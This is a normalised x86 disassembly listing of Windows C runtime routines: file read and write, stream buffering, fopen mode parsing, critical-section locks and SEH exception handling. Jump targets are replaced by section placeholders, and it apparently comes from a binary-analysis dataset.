mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_40dafd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_40dafd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_40db54
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_409a53
push 0x10
push r--data
call sub_409f90
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_409fd5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_409356
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409b1f
mov eax [ ebp - 0x1c ]
sub_409b27
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
pop ebp
retn
sub_409b4d
push 0x10
push r--data
call sub_409f90
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_409fd5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40dcd2
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409c1e
mov eax [ ebp - 0x1c ]
call sub_405d52
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_409c26
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_409cde
push 0xc
push r--data
call sub_409f90
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_406266
push 0x1e
call sub_4060b7
push 0xff
call sub_405dd1
push 0x18
call sub_40c067
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405d3f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_409fd5
retn
push edi
call sub_404538
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_404538
pop ecx
call sub_405d3f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409d97
mov eax [ ebp - 0x1c ]
sub_409da0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_409cde
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_406073
sub_409dd9
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40c0ac
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40c0ac
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_409eaa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_409da0
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_409eeb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_409da0
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_409f1d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_409cc7
pop ecx
pop ebp
retn
sub_409f59
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_409cc7
pop ecx
pop ebp
retn
sub_409f90
push sub_409ff0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_409ff0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4042ed
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4042ed
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40a68b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40a642
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4042ed
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4042ed
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40a672
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40a68b
mov eax [ ebp + 0xc ]
push r--data
call sub_40c540
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4042ed
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40a659
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4042ed
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_40a17f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_40e82e
add esp 0x14
test eax eax
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_40ebb8
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_40ea52
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_40ea52
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_40ea52
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_40a416
push 0x10
push r--data
call sub_409f90
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a540
mov eax edi
call sub_409fd5
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_40c067
pop ecx
mov ecx [ rw-data ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_404538
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_409eeb
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_409cde
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_409f59
pop ecx
pop ecx
sub_40a550
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40a5e0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40ecf5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40ed14
jmp r-xdata
sub_40a5e0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4042ed
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40a550
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40a642
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40a672
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a6a2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40cad6
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_409b27
pop ecx
push eax
call sub_40ad7b
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_409b27
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_409b27
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_409b27
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_409b27
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40a7c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_405d52
mov [ eax ] ebx
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_405d52
mov [ eax ] ebx
call sub_405d3f
mov [ eax ] 0x9
jmp r-xdata
call sub_405d52
mov [ eax ] ebx
call sub_405d3f
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_4071e0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_40c067
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40c967
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_405d3f
mov [ eax ] 0xc
call sub_405d52
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_405d65
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_404538
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
